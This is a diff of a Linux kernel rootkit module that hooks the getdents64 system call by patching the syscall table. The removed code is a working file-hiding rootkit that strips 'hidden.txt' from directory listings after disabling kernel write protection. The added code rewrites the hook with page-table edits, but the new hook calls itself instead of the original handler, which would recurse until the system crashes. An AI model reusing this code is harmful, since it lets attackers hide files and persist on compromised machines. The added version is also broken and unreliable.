@@ -1,120 +1,94 @@
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
-#include <linux/kprobes.h>
+#include <linux/kallsyms.h>
+#include <linux/unistd.h>
 #include <linux/dirent.h>
-
-#define HIDE_ME "hidden.txt"
-
-typedef long (*getdents64_t)(const struct pt_regs *pt_registers);
-getdents64_t org_getdents64;
-unsigned long * syscall_table;
+#include <linux/types.h>
+#include <asm/uaccess.h>
+#include <asm/cacheflush.h>
+#include <linux/syscalls.h>
 
 MODULE_LICENSE("GPL");
 
-static struct kprobe kp = {
-    .symbol_name = "kallsyms_lookup_name"
-};
+static unsigned long ** p_sys_call_table;
 
-asmlinkage long sys_getdents64_hook(const struct pt_regs *pt_registers) {
-  int ret = org_getdents64(pt_registers);
-  int err;
-  struct linux_dirent64 *dir, *kdirent, *prev = NULL;
-  struct linux_dirent64 *dirent = (struct linux_dirent64 *) pt_registers->si;
-  unsigned long i = 0;
+asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+asmlinkage int (*test_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 
-  printk(KERN_INFO "HOOKED2");
-  if (ret <= 0) {
-    return ret;
-  }
 
-  kdirent = kvzalloc(ret, GFP_KERNEL);
-  if (kdirent == NULL) {
-    return ret;
-  }
-
-  err = copy_from_user((void *) kdirent, dirent, (unsigned long) ret);
-  if (err) {
-    kvfree(kdirent);
-    return ret;
-  }
-
-  while (i < ret) {
-   dir = (void*) kdirent + i;
-   if (memcmp(HIDE_ME, (char *)dir->d_name, strlen(HIDE_ME)) == 0) {
-     printk(KERN_ALERT "found the HIDE_ME file");
-     if (dir == kdirent) {
-       // first dirent in chain
-       ret -= dir->d_reclen;
-       memmove(dir, (void*)dir + dir->d_reclen, ret);
-       continue;
-     }
-     prev->d_reclen += dir->d_reclen;
-   }
-   else {
-     prev = dir;
-   }
-   i += dir->d_reclen;
-  }
-  
-  err = copy_to_user(dirent, kdirent, (unsigned long) ret);
-  if (err) {
-    kvfree(kdirent);
-    return ret;
-  }
-  return ret;
+asmlinkage int hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
+    printk(KERN_INFO "[+] rootkit succsess hook!\n");
+    return hooked_getdents64(fd, dirp, count);
 }
 
-extern unsigned long __force_order;
-static inline void mywrite_cr0(unsigned long value) {
-  asm volatile("mov %0,%%cr0":"+r"(value),"+m"(__force_order));
-}
-       
-
-static unsigned long * get_syscall_table(void) {
-  /* typedef for kallsyms_lookup_name() so we can easily cast kp.addr */
-  typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
-  kallsyms_lookup_name_t kallsyms_lookup_name;
-
-  /* register the kprobe */
-  register_kprobe(&kp);
-
-  /* assign kallsyms_lookup_name symbol to kp.addr */
-  kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
-    
-  /* done with the kprobe, so unregister it */
-  unregister_kprobe(&kp);
-  return (unsigned long *) kallsyms_lookup_name("sys_call_table");
+int set_page_rw(unsigned long addr){
+    printk(KERN_INFO "[+] rootkit settin the page to rw\n");
+    unsigned int level;
+    pte_t *pte = lookup_address(addr, &level);
+    if (pte->pte &~ _PAGE_RW)
+    {
+        pte->pte |= _PAGE_RW;
+        printk(KERN_INFO "[+] rootkit set the page to rw\n");
+        return 0;
+    }
+    return 1;
 }
 
-static int __init replace_getdents_syscall(void) {
-  printk(KERN_INFO "init");
-  unsigned long orig_cr0;
-  syscall_table = get_syscall_table();
-  printk(KERN_INFO "2");
-  if (syscall_table == 0) {
-    printk(KERN_ALERT "replace_getdents_syscall: could not get syscall table address");
+int set_page_ro(unsigned long addr) {
+    printk(KERN_INFO "[+] rootkit settin the page to ro\n");
+    unsigned int level;
+    pte_t *pte = lookup_address(addr, &level);
+    pte->pte = pte->pte &~_PAGE_RW;
+    printk(KERN_INFO "[+] rootkit set the page to ro\n");
     return 0;
-  }
-  printk(KERN_INFO "3");
-  orig_cr0 = read_cr0();
-  mywrite_cr0(orig_cr0 & (~0x10000));
-  org_getdents64 = (getdents64_t)syscall_table[__NR_getdents64];
-  printk(KERN_INFO "org_getdents64: %lx", org_getdents64);
-  syscall_table[__NR_getdents64] = (unsigned long int)sys_getdents64_hook;
-  mywrite_cr0(orig_cr0);
-  return 0;
 }
 
-static void __exit clear(void) {
-  unsigned long orig_cr0;
-  if (syscall_table != 0) {
-    orig_cr0 = read_cr0();
-    mywrite_cr0(orig_cr0 & (~0x10000));
-    syscall_table[__NR_getdents64] = (long unsigned int) org_getdents64;
-    mywrite_cr0(orig_cr0);
-  }
+static int __init init_rootkit(void) {
+    printk(KERN_INFO "[+] rootkit init_rootkit\n");
+    //Find the sys_call_table pointer in the kernel, you can check in /proc/kallsyms if its the same pointer.
+    p_sys_call_table = (void *) kallsyms_lookup_name("sys_call_table");
+    if (0 == p_sys_call_table)
+    {
+        printk(KERN_INFO "[!] rootkit Error Finding sys_call_table\n");
+        return 1;
+    }
+    printk(KERN_INFO "[+] rootkit p_sys_call_table = %lx\n", p_sys_call_table);
+
+    // Try to find the original getdents64 pointer.
+    original_getdents64 = (void *)p_sys_call_table[__NR_getdents64];
+    if (0 == original_getdents64)
+    {
+        printk(KERN_INFO "[-] rootkit Error finding the original_getdents64\n");
+        return 1;
+    }
+    printk(KERN_INFO "[+] rootkit original_getdents64 = %lx\n", original_getdents64);
+
+    // Change the sys_call_table pointer to out pointer.
+    set_page_rw((unsigned long)p_sys_call_table);
+    printk(KERN_INFO "[+] rootkit setting the getdents64 pointer to out pointer. out ptr: %lx\n", hooked_getdents64);
+    p_sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
+    set_page_ro((unsigned long)p_sys_call_table);
+
+    test_getdents64 = (void *)p_sys_call_table[__NR_getdents64];
+    if (0 == test_getdents64)
+    {
+        printk(KERN_INFO "[-] rootkit Error finding the test_getdents64\n");
+        return 1;
+    }
+    printk(KERN_INFO "[+] rootkit test_getdents64 = %lx\n", test_getdents64);
+
+
+    return 0;
 }
 
-module_init(replace_getdents_syscall);
-module_exit(clear);
+static void __exit exit_rootkit(void) {
+    printk(KERN_INFO "[+] rootkit exit_rootkit\n");
+    set_page_rw((unsigned long)p_sys_call_table);
+    p_sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
+    set_page_ro((unsigned long)p_sys_call_table);
+    return;
+}
+
+module_init(init_rootkit);
+module_exit(exit_rootkit);
